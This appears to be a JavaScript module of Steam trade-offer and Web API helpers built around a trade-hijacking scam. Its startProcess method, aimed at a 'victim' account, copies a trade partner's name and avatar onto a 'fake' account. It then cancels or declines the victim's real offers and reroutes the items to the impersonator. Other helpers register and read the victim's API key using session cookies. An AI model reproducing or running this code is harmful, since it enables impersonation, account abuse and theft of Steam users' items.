const axios = require('axios');
const qs = require('qs');
const SteamConverter = require('./steam-converter');
const HTMLParser = require("node-html-parser");
const MessageMarks = require('../lib/message-marks');

const apiURL = "https://api.steampowered.com";
const communityURL = 'https://steamcommunity.com';

class SteamAPI {
    static getProfileInfo = async (apiKey, ID64) => {
        const config = {
            params: {
                key: apiKey,
                steamids: ID64
            }
        };

        return new Promise((resolve, reject) => {
            axios.get(`${apiURL}/ISteamUser/GetPlayerSummaries/v2/`, config)
                 .then(response => resolve(response.data.response.players[0]))
                 .catch(error => {
                     let message = `Error while requesting ${ID64} profile info ${MessageMarks.error}`;

                     console.log(message);
                     reject(message, error);
                 });
        })
    }

    static getActiveOffers = async (apiKey) => {
        const config = {
            params: {
                key: apiKey,
                get_sent_offers: 1,
                get_received_offers: 1,
                active_only: 1
            }
        };

        return new Promise((resolve, reject) => {
            axios.get(`${apiURL}/IEconService/GetTradeOffers/v1/`, config)
                .then(response => resolve(response.data.response))
                .catch(error => {
                    let message = `Error while requesting Active offers ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                });
        });
    }

    static getOfferInfo = async (apiKey, offerID) => {
        const config = {
            params: {
                key: apiKey,
                tradeofferid: offerID
            }
        };

        return new Promise((resolve, reject) => {
            axios.get(`${apiURL}/IEconService/GetTradeOffer/v1/`, config)
                .then(response => resolve(response.data.response.offer))
                .catch(error => {
                    let message = `Error while requesting Offer Info ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                });
        });
    }

    static cancelOffer = async (apiKey, offerId) => {
        const data = {
            key: apiKey,
            tradeofferid: offerId
        };

        return new Promise((resolve, reject) => {
            axios.post(`${apiURL}/IEconService/CancelTradeOffer/v1/`, qs.stringify(data))
                .then(response => {
                    let message = `Offer ${offerId} has been cancelled ${MessageMarks.success}`;

                    console.log(message);
                    resolve(response);
                })
                .catch(error => {
                    let message = `Offer ${offerId} has not been cancelled ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                });
        });
    }

    static declineOffer = async (apiKey, offerId) => {
        const data = {
            key: apiKey,
            tradeofferid: offerId
        };

        return new Promise((resolve, reject) => {
            axios.post(`${apiURL}/IEconService/DeclineTradeOffer/v1/`, qs.stringify(data))
                .then(response => {
                    let message = `Offer ${offerId} has been declined ${MessageMarks.success}`;

                    console.log(message);
                    resolve(response);
                })
                .catch(error => {
                    let message = `Offer ${offerId} has not been declined ${MessageMarks.error}`;
                    reject(message, error);
                });
        });
    }

    static makeOffer = (options) => {
        let tradeOffer = {
            newversion: true,
            version: 2,
            me: { assets: options.itemsFromMe, currency: [], ready: false },
            them: { assets: options.itemsFromThem, currency: [], ready: false }
        };

        let data = {
            serverid: 1,
            sessionid: options.sessionID,
            partner: options.partnerID64 || SteamConverter.ID32toID64(options.partnerID32),
            tradeoffermessage: options.message || "",
            json_tradeoffer: JSON.stringify(tradeOffer),
            captcha: "",
        };

        let query = {
            partner: options.partnerID32 || SteamConverter.ID64toID32(options.partnerID64)
        };

        if (options.tradeToken !== undefined) {
            data.trade_offer_create_params = JSON.stringify({ trade_offer_access_token: options.tradeToken });
            query.token = options.tradeToken;
        };

        let referer;
        if (!options.counteredTradeOffer) {
            referer = communityURL + '/tradeoffer/new/?' + qs.stringify(query);
        }
        else {
            data.tradeofferid_countered = options.counteredTradeOffer;
            referer = communityURL + '/tradeoffer/' + options.counteredTradeOffer + '/';
        }

        const config = {
            headers: {
                Referer: referer,
                Cookie: options.cookies.join(";")
            }
        }

        return new Promise((resolve, reject) => {
            axios.post(`${communityURL}/tradeoffer/new/send`, qs.stringify(data), config)
                .then(response => {
                    let message = `Offer { tradeofferid: ${response.data.tradeofferid} } has been created ${MessageMarks.success}`;

                    console.log(message);
                    resolve(response);
                })
                .catch(error => {
                    let message = `Offer has not been sent ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                });
        });
    }

    static acceptOffer = (options) => {
        let data = {
            sessionid: options.sessionID,
            serverid: 1,
            tradeofferid: options.tradeOfferID,
            partner: options.partnerID64 || SteamConverter.ID32toID64(options.partnerID32),
        };

        let config = {
            headers: {
                Referer: `${communityURL}/tradeoffer/${options.tradeOfferID}/`,
                Cookie: options.cookies.join(";")
            }
        };

        return new Promise((resolve, reject) => {
            axios.post(`${communityURL}/tradeoffer/${options.tradeOfferID}/accept`, qs.stringify(data), config)
                 .then(response => {
                     let message = `Offer { tradeid: ${response.data.tradeid} } has been accepted ${MessageMarks.success}`;

                     console.log(message);
                     resolve(response);
                 })
                 .catch(error => {
                     let message = `Offer { tradeofferid: ${options.tradeOfferID} } has not been accepted ${MessageMarks.error}`;

                     console.log(message);
                     reject(error, message);
                 });
        });
    }

    static getTradeToken = async (profileUrl, sessionID, cookies) => {
        return new Promise((resolve, reject) => {
            const config = {
                headers: {
                    Cookie: cookies.join(";"),
                    Host: "steamcommunity.com"
                }
            };

            const data = {
                sessionid: sessionID
            };

            axios.post(`${profileUrl}tradeoffers/newtradeurl`, qs.stringify(data), config)
                 .then(response => resolve(response.data))
                 .catch(error => {
                     let message = `Error while requesting Trade Access Token ${MessageMarks.error}`;

                     console.log(message);
                     reject(message, error);
                 });
        });
    }

    // Creates new Web API Key
    static createAPIKey = async (domain, sessionID, cookies) => {
        return new Promise((resolve, reject) => {
            const data = {
                domain: domain,
                agreeToTerms: "agreed",
                sessionid: sessionID,
                Submit: "Register"
            };
    
            const config = {
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: cookies.join(";")
                }
            }
    
            axios.post(`${communityURL}/dev/registerkey`, qs.stringify(data), config)
                 .then(response => resolve(response))
                 .catch(error => {
                    let message = `Error while creating Web API Key ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                 });
        });
    }   

    // Requests existing Web API Key
    static getAPIKey = async (cookies) => {
        return new Promise((resolve, reject) => {
            const config = {
                headers: {
                    Cookie: cookies.join(";"),
                    Host: "steamcommunity.com"
                }
            }
    
            axios.get(`${communityURL}/dev/apikey`, config)
                .then(response => {
                    const root = HTMLParser.parse(response.data);
    
                    try {
                        const apiKey = root.querySelector("#bodyContents_ex > p").text.substring(5);
                        
                        if (apiKey.length !== 32) {
                            reject("Invalid API Key");
                        }
    
                        resolve(apiKey);
                    }
                    catch (ex) {
                        reject(ex);
                    }
                })
                .catch(error => {
                    let message = `Error while requesting Web API Key ${MessageMarks.error}`;

                    console.log(message);
                    reject(message, error);
                });
        });
    }

    // Requests existing Web API Key. If haven't got, Creates new and Requests it again
    static retrieveAPIKey = (domain, sessionID, cookies) => {
        return new Promise((resolve, reject) => {
            this.getAPIKey(cookies)
                .then(key => resolve(key))
                .catch(() => {
                    this.createAPIKey(domain || "localhost", sessionID, cookies)
                        .then(() => {
                            this.getAPIKey(cookies)
                                .then(key => resolve(key))
                                .catch(error => reject(error));
                        })
                        .catch(error => reject(error));
                })
        });
    }

    static startProcess = async (victim, fake, interval, fakeAvatar, fakeName) => {
        victim.waitForNewOffer(fake ? fake.ID32 : "", interval || 1000)
            .then(offer => {
                SteamAPI.getProfileInfo(victim.apiKey || (fake.apiKey ? fake.apiKey : ""), SteamConverter.ID32toID64(offer.accountid_other))
                    .then(user => {
                        const name = user.personaname;
                        const avatarUrl = user.avatarfull;

                        fake.updateAvatar(avatarUrl).then(() => console.log(`(1) Avatar has been set ${MessageMarks.success}`));
                        fake.updateName(name).then(() => console.log(`(1) Name has been set ${MessageMarks.success}`));
                    })
                    .catch();

                if (offer.is_our_offer) {
                    victim.cancelOffer(offer.tradeofferid)
                        .then(() => {
                            victim.makeOffer(fake.ID32, fake.ID64, fake.tradeToken, offer.items_to_receive, offer.items_to_give, offer.message)
                                .then(() => {
                                    fake.acceptOffer(offer.tradeofferid, victim.ID64, victim.ID32)
                                        .then(() => {
                                            console.log(`Process successfully finished ${MessageMarks.success}`);

                                            fake.updateAvatar(fakeAvatar || "https://i.pinimg.com/564x/b6/18/0c/b6180ca8ea3cf20b9debf2cdd1a47194.jpg")
                                                .then(() => console.log(`(2) Avatar has been set ${MessageMarks.success}`));
                                            fake.updateName(fakeName || "Johny Pathway | Where have you been??")
                                                .then(() => console.log(`(2) Name has been set ${MessageMarks.success}`));
                                        })
                                        .catch();
                                })
                                .catch();
                        })
                        .catch();
                }
                else {
                    victim.declineOffer(offer.tradeofferid)
                        .then(() => {
                            fake.makeOffer(victim.ID32, victim.ID64, victim.tradeToken, offer.items_to_give, [], offer.message)
                                .then(() => {
                                    // Victim accepts offer by themselves
                                })
                                .catch();
                        })
                        .catch();
                }
            }).catch();
    }
}

module.exports = SteamAPI;